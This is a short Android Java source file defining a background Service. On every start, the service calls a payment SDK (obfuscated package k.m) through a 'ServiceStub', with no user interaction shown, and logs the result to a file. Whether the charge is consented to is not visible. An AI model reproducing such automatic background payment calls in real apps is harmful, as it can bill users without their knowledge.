package com.thirdparty.engine.ui;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import com.gandalf.daemon.utils.XL_log;
import com.thirdparty.engine.AppBuildConfig;
import com.thirdparty.engine.ServiceStub;

import k.m.IStub;
import k.m.PayListener;
import k.m.PayTask;


/**
 * Created by as on 17-7-26.
 */

public class MyService extends Service {
    private XL_log log = null;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        test();
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        initDate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        IStub stub = ServiceStub.getInstance(this.getApplicationContext());
        if (stub != null) {
            stub.stopService();
        }
    }

    private void test() {
        IStub stub = ServiceStub.getInstance(MyService.this.getApplicationContext());
        PayTask task = new PayTask(0, AppBuildConfig.PID, "0", new PayListener() {
            @Override
            public void onPaySuccess() {
                if (log != null)
                    log.debug("onPaySuccess");
            }

            @Override
            public void onPayFailed(int errorCode, String errorMsg) {
                if (log != null)
                    log.error("onPayFailed code:" + errorCode + " msg:" + errorMsg);
            }
        });
        stub.pay(task);

    }

    private void initDate() {
        XL_log.init(this, "dd.log");
    }
}
